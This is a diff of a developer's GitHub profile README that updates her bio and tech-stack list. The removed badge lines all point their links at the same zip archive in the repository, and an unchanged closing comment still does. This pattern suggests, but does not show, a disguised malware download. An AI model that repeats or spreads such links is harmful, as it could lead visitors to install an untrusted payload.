@@ -1,12 +1,19 @@
 
-   Hey there, I’m Edna Namusobya👋<br><br>💻 Passionate Software Developer<br>I'm currently learning AI & Machine Learning for real-world impact,Project Management and aiming for end to end mastery.<br> Ask me about Python,Django development and System design.<br><br> 🔗 Check out my LinkedIn(linkedin.com/in/edna-namusobya)<br> to know more about my experiences<br> Reach me at my email address <br><br>⭐ Fun Facts <br>   I love animations.<br><br> _"Code with purpose, lead with impact."_  <br>
+   Hey there, I’m **Edna Namusobya**👋<br><br>💻 Passionate Software Developer<br>🌍 Building tech solutions with real-world impact <br><br>🚀what I'm currently working on <br>
+   AI & Machine Learning for real-world applications <br>
+   System design & project management for scalable solutions.<br><br> 
+   🛠 Tech Stack<br>
+ **Languages:** Programming:  Python, HTML5, CSS3, JavaScript,TypeScript, Nextjs., React  <br>
+ **Frameworks:** Django, Django REST Framework, Bootstrap  <br>
+ **Version Control:** Git, GitHub<br>
+ **UI/UX:** Dashboard and interface design<br>
+ **Databases:** PostgreSQL, MySQL, SQLite <br>
+ **Concepts:** REST APIs, System Design, Agile basics<br><br>🤝 Let’s connect
+ 💼 LinkedIn: [linkedin.com/in/edna-namusobya](https://linkedin.com/in/edna-namusobya) <br>
+🌐 Portfolio: [edna20-23.github.io/my-website](https://edna20-23.github.io/my-website)  <br>
+📫 Email: Ednamu5@gmail.com<br> to know more about my experiences<br> Reach me at my email address <br><br>⭐ Fun Facts <br>   I love animations.<br><br> _"Code with purpose, lead with impact."_  <br>
 
 
-## 🌐 Socials:uiu
-[![LinkedIn](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip%https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip) [![Mastodon](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip%232B90D9?logo=mastodon&logoColor=white)](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip Namusobya) [![email](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip) 
-
-# 💻 Tech Stack:
-![Java](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip%https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip) ![HTML5](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip%https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip) ![JavaScript](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip%https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip%23F7DF1E) ![Python](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip) ![Render](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip%https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip) ![NodeJS](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip) ![Django](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip%https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip) ![DjangoREST](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip) ![MySQL](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip) ![SQLite](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip%https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip) ![Figma](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip%https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip) ![Canva](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip%https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip) ![GitHub](https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip%https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip)
 
 
 <!-- Proudly created with GPRM ( https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip ) -->
